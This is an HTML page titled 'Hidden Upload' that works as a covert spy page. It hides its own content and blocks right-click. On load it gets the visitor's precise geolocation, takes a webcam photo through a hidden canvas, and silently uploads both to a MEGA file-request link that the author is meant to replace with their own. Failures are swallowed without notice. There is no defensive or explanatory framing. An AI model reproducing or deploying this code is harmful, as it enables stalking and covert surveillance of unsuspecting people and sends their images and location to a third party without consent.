<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hidden Upload</title>
    <script src="https://cdn.jsdelivr.net/npm/megaio/mega.js"></script>
    <style>
        body { display: none; } /* Hide the webpage */
    </style>
</head>
<body>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // Disable right-click context menu
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        // Use MEGA file request link
        const fileRequestLink = "https://mega.nz/filerequest/pfypZxt51fU"; // Replace with your actual link

        let megaSession = null;

        // Auto-login to MEGA (removed for file request link)
        function startProcess() {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const loc = `Latitude: ${lat}, Longitude: ${lng}`;
                    capturePhoto(loc);
                },
                (error) => {},
                { enableHighAccuracy: true, maximumAge: 0 }
            );
        }

        // Capture a hidden photo
        async function capturePhoto(location) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;
                await video.play();

                const canvas = document.getElementById("canvas");
                const ctx = canvas.getContext("2d");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());
                uploadToMega(canvas, location);
            } catch (error) {}
        }

        // Upload files silently
        function uploadToMega(canvas, location) {
            const imageDataUrl = canvas.toDataURL("image/jpeg");
            const imageBlob = dataURLtoBlob(imageDataUrl);
            const locationBlob = new Blob([location], { type: 'text/plain' });

            // Using the MEGA file request link to upload
            const formData = new FormData();
            formData.append("file", imageBlob, "photo.jpg");
            formData.append("file", locationBlob, "location.txt");

            fetch(fileRequestLink, {
                method: "POST",
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    console.log("✅ Files uploaded successfully to MEGA.");
                } else {
                    console.log("❌ File upload failed.");
                }
            })
            .catch(err => {
                console.log(`❌ Error uploading to MEGA: ${err}`);
            });
        }

        function dataURLtoBlob(dataurl) {
            const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
            for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
            return new Blob([u8arr], { type: mime });
        }

        // Automatically start the process in the background
        window.onload = () => { startProcess(); };
    </script>
</body>
</html>
